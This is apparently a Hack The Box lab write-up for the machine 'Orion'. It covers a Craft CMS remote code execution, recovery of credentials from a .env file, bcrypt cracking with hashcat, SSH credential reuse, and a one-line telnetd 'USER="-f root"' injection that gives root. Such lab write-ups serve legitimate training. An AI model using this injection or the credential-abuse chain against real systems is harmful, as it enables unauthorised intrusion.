Orion

HTBEasyRCESSHCredential Abuse

Orion is an easy Linux machine running Craft CMS 5.6.16. An unauthenticated RCE in Craft CMS provides a shell as www-data, where database credentials can be recovered from the application's environment file. Cracking the Craft admin password provides SSH access as adam, while a locally exposed GNU inetutils telnetd 2.7 service is vulnerable to CVE-2026-24061, allowing a direct root shell.

Solved: July 28, 2026

Recon

Started with a basic Nmap scan:

nmap
$ nmap -sC -sV -Pn 10.129.x.x

The scan revealed two externally accessible services:

PortServiceVersion
22SSHOpenSSH
80HTTPnginx

The HTTP service redirected to the hostname:

http://orion.htb/

We added the hostname to /etc/hosts:

10.129.x.x orion.htb

Enumeration

HTTP - TCP 80

Visiting http://orion.htb/ revealed a website belonging to a telecommunications company.

The application appeared to be running Craft CMS.

Further enumeration identified the Craft administration panel:

/admin/login

The login page revealed the exact CMS version:

Craft CMS 5.6.16

Craft CMS 5.6.16 was significant because this version is affected by a pre-authentication remote code execution vulnerability, CVE-2025-32432. The vulnerability affects Craft's image transformation functionality and can be exploited through unsafe object deserialization.

Initial Access

We used the Craft CMS vulnerability to obtain unauthenticated remote code execution on the server.

The exploit resulted in command execution as the web server account:

www-data

We verified the account:

whoami
$ whoami
www-data

With command execution established, we began enumerating the Craft installation.

Craft Configuration

The Craft application contained an environment configuration file:

.env

The file contained credentials used by the Craft installation to access its MariaDB database.

The database password was:

SuperSecureCraft123Pass!

The database was running locally, so we could use the credentials to enumerate the application database.

Database Enumeration

We connected to the local MySQL/MariaDB service:

mysql
$ mysql -u root -pSuperSecureCraft123Pass! -h 127.0.0.1

We selected the orion database and enumerated its tables.

The users table contained the Craft administrator account:

username: admin email: adam@orion.htb password: $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS

The password was stored as a bcrypt hash.

Password Cracking

We saved the hash locally and used Hashcat with the rockyou.txt wordlist:

hashcat
$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

The hash cracked successfully:

$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel

This gave us the password:

darkangel

The email address associated with the Craft account was:

adam@orion.htb

This suggested that the password could potentially be reused for the system account adam.

Privilege Escalation

We tested the recovered credentials over SSH:

ssh
$ ssh adam@orion.htb

Using:

Username: adam Password: darkangel

The credentials worked and provided an SSH session as adam.

We retrieved the user flag:

cat
$ cat user.txt
99ea76b5f7cb1d08acd572b154986b43

At this point we had user-level access.

Local Service Enumeration

We then enumerated locally listening services:

ss
$ ss -lntp

Among the services was a Telnet daemon listening only on localhost:

127.0.0.1:23

Because the service was bound to 127.0.0.1, it was not visible from our initial external Nmap scan.

We checked the Telnet client version:

telnet
$ telnet --version

The system reported:

telnet (GNU inetutils) 2.7

GNU inetutils telnetd 2.7 is affected by CVE-2026-24061, an authentication-bypass vulnerability involving unsafe handling of the USER environment variable.

Root

The vulnerable Telnet service can be abused by supplying a crafted USER value containing the -f root argument.

We connected to the local Telnet service with:

USER="-f
$ USER="-f root" telnet -a 127.0.0.1

The vulnerable Telnet daemon passed the manipulated value to login, causing the -f root option to be interpreted as an instruction to treat the connection as already authenticated for the root account.

The connection resulted in a root shell.

We verified our privileges:

id
$ id
uid=0(root) gid=0(root) groups=0(root)

Finally, we retrieved the root flag:

cat
$ cat /root/root.txt
[ROOT FLAG]

The machine was fully compromised.

Key Takeaways

  • Enumerate the application before attacking it. Identifying Craft CMS and its exact version revealed a promising attack surface.
  • Version enumeration matters. Craft CMS 5.6.16 was vulnerable to a pre-authentication RCE.
  • Check application configuration files after obtaining a web shell. The .env file contained the database password.
  • Database enumeration can reveal additional credentials. The Craft users table contained the administrator's bcrypt password hash.
  • Test credential reuse. The cracked darkangel password worked for the adam SSH account.
  • Enumerate localhost services after gaining a shell. Telnet was bound only to 127.0.0.1, so it was invisible from the external scan.
  • Check versions of unusual local services. GNU inetutils telnetd 2.7 was vulnerable to CVE-2026-24061.
  • Privilege escalation does not always require a traditional Linux exploit. The Telnet authentication bypass provided direct root access.
